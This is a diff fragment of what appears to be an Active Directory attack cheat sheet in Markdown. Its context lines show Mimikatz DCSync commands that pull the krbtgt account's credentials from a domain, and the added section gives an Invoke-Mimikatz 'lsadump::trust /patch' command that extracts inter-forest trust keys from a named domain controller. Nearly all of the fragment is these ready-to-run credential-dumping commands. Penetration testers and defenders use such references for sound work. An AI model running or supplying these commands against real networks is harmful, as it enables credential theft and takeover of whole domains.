@@ -103,5 +103,9 @@ lsadump::dcsync /domain:target.domain.com /user:prod\krbtgt
  Invoke-Mimikatz -Command '"lsadump::dcsync /user:Domain\krbtgt"'
 ```
 
+## Trust Key between Forest and Child
 
+```csharp
+ Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.lab.test.local
+```
 
